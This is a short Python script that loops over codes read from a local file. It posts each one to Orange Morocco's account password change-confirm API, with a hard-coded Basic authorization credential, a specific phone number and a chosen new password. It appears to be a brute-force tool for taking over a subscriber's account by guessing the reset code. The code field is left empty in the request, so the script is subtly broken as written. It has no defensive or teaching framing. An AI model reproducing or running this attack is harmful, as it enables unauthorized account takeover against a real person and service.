import requests
import threading,os
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
ss = 0
aa = 0
rfile = open("666",'r')
while True:
	try:
		ff = rfile.readline().split('\n')[0]
		codes = "0"+ff
		url = "https://apps.orange.ma/orangeetmoi/api/backend/v7.8/account/password/change-confirm"
		headers = {
		            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
		            "Host": "apps.orange.ma",
		            "Connection": "Keep-Alive",
		            "Accept-Encoding": "gzip",
		            "Authorization": "Basic bW9iaWxlX3VzZXI6T3JhbmdlXzIwMTg="
		}
		data = {"culture":"fr","code":"","msisdn":"0774150225","password":"me12345%40%40","password_again":"me12345%40%40"}
		req = requests.post(url, headers=headers, data=data)
		print(req)
		if "200" in req.text:
		    ss += 1
		else:
			aa += 1
			print(f"BAD CODES >>>>[{codes}][{aa}]\nGOODS CODES >>>> {ss}")
	except requests.exceptions.ConnectionError as e:
		print(f"BAD REQ >>> {codes}")